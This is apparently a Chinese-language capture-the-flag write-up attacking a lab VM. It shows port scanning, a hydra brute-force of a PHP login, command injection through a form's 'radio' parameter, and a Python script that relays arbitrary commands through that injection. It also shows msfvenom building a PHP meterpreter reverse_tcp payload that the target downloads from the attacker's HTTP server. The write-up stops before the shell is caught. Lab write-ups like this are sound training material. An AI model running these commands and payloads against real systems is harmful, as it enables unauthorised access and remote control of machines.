# discover

## ip
直接使用arp-scan扫描得出结果

192.168.31.241  00:0c:29:2d:55:4f       VMware, Inc.

## services

rustscan 
``` bash
rustscan 192.168.31.241 --ulimit 5000 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust

<<<<infomation missing!!!!!!!!!!>>>>
```

端口|服务
---|---
22|ssh 
80|ngnix-1.15.10


## rest infomation

### 目录枚举

我经历了一些目录爆破和密码爆破 并且此处使用了hydra

目录信息如下

|name
|---
|login.php
|logoff.php
|index.php
|images
|css
|command.php

剩下主要是一些失败的尝试

### sql注入可能性排除

首先并不清楚是不是有sql存在

然后通过sqlmap和自己的手动注入试了一下

并不可行

### 失败的密码爆破

然后是失败的密码爆破

run on hydra 然后我找到了很多错误的结果

使用指令

``` bash
hydra -l admin -P /usr/share/wordlist/rockyou.txt 192.168.31.214 http-post-form "/login.php:username=^USER^&password=^PASS^&login=command:login fail"

```
结果便是

```
1 of 1 target successfully completed, 16 valid passwords found
```

>整理出来一个整齐的格式可以使用指令cut 以及 sed （去空格 print 第几位单词） 
>``` bash
>sed 's/ //g'
>```
>
>or
>
>``` bash
>cut -d " " -f 2
>```
>这里展示的是去掉行首空格的办法

看到那12个结果不免有些惊慌失措

通过｜ 的命令拼接以及一些处理（使用cut sed） 便可以拿出一个可能的密码列表

we can burp for it

很可笑的是 all fail ..

如果有任何人知道我为什么密码爆破出错的话可以在评论区告诉我

# 攻击 寻找攻击方向

## 突破点

在浏览目录的时候

由于每一次的浏览器浏览都会导致302重定向到index让你login

于是 在curl和burp的努力下

我发现了一些被我忽略的信息

```
$ curl "http://192.168.31.241//command.php"       
<html>
<head>
<title>System Tools - Command</title>
<link rel="stylesheet" href="css/styles.css">
</head>

<body>
        <div class="container">
           
Disk Usage     <div class="inner">


                        <form method="post" action="command.php">
                                <strong>Run Command:</strong><br>
                                <input type="radio" name="radio" value="ls -l" checked="checked">List Files<br />
                                <input type="radio" name="radio" value="du -h">Disk Usage<br />
                                <input type="radio" name="radio" value="df -h">Disk Free<br />
                                <p>
                                <input type="submit" name="submit" value="Run">
                        </form>

                        You need to be logged in to use this system.<p><a href='index.php'>Click to Log In Again</a>
                </div>
        </div>
</body>
</html>                        
```

这里很明显传递了一个radio的参数可以进行远程命令执行

但是无论如何都需要登陆才能返回

一开始的我是猜测是不是可能会存在一种情况

即： 我的指令是真实被执行的 但是只是我看不到返回的信息就被系统清除掉了

经过一系列尝试 发现并没有这种可能 

也就是利用nc指令来做到 连接我的端口 输出命令执行成功的信息这样

## 成功的密码爆破


force me to login?

and i run my burp pro and

it works

info|detail
---|---
wordlist|rockyou.txt
username|admin
password|happy

copy the url as curl in web broswer

我们可以看到

``` bash
$ curl 'http://192.168.31.241/command.php' \
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
-H 'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' \
--compressed \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Origin: http://192.168.31.241' -H 'Connection: keep-alive' \
-H 'Referer: http://192.168.31.241/command.php' \
-H 'Cookie: PHPSESSID=alidntd129mheml2nuvpq649n5' \
-H 'Upgrade-Insecure-Requests: 1' \
--data-raw 'radio=ls+/&submit=Run'
```
## exp
edit 这个 radio 变量就可以进行远程控制

and i run python to simple exp it 

（直接调用shell了就不用requests库了）

``` python
import os

while 1:
    youCommand=input("cmd=")
    if youCommand == "end":
        break
    response=os.popen("curl 'http://192.168.31.241/command.php' \
            -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' \
            -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
            -H 'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' \
            --compressed -H 'Content-Type: application/x-www-form-urlencoded'\
            -H 'Origin: http://192.168.31.241' -H 'Connection: keep-alive' \
            -H 'Referer: http://192.168.31.241/command.php' \
            -H 'Cookie: PHPSESSID=alidntd129mheml2nuvpq649n5' \
            -H 'Upgrade-Insecure-Requests: 1' \
            --data-raw 'radio=%s&submit=Run'" %(youCommand)).read()
    print( response.split("<pre>")[1].split("</pre>")[0] )


```

运行效果如下：

``` bash
python <exp>.py
cmd=cat /home/jim/test.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   957    0   919  100    38   149k   6333 --:--:-- --:--:-- --:--:--  155k
#!/bin/bash
for i in {1..5}
do
 sleep 1
 echo "Learn bash they said."
 sleep 1
 echo "Bash is good they said."
done
 echo "But I'd rather bash my head against a brick wall."


 try to send shell.php file

 ```

进行一波探测和弹出shell的尝试

非常熟练的生成shell 尝试传递

 ``` bash
┌──(kali㉿Esonhugh)-[~]
└─$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.141 LPORT=4444 -f raw -o ./shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1115 bytes
Saved as: ./shell.php

┌──(kali㉿Esonhugh)-[~]
└─$ python -m http.server
python3 is default python version in python command which created by alias

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.31.241 - - [16/Jan/2021 18:31:34] "GET /shell.php HTTP/1.1" 200 -


 ```

To be continue ..
